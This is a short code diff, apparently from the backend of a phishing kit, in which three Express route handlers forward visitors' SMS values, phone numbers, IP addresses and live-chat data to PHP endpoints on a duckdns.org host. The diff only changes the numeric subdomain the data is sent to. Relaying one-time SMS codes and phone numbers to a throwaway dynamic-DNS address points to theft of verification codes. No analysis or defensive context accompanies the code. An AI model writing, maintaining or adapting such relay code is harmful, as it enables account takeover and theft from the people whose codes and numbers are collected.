@@ -212,7 +212,7 @@ app.post('/sms', async (req, res) => {
   try {
 
  
-    const response = await axios.post('https://55514485547555.duckdns.org/sms.php', {
+    const response = await axios.post('https://088855488854758.duckdns.org//sms.php', {
       ip: clientIp,
       sms: sms
     });
@@ -240,7 +240,7 @@ app.post('/livechats', async (req, res) => {
       };
   
  
-      const response = await axios.post('https://55514485547555.duckdns.org/livechats.php', postData);
+      const response = await axios.post('https://088855488854758.duckdns.org//livechats.php', postData);
  
       res.send(response.data);
     } catch (error) {
@@ -256,7 +256,7 @@ app.post('/livechatss', async (req, res) => {
 
   try {
      
-    const response = await axios.post('https://55514485547555.duckdns.org/phone.php', {
+    const response = await axios.post('https://088855488854758.duckdns.org//phone.php', {
       ip: clientIp,
       phone2: phone2
     });
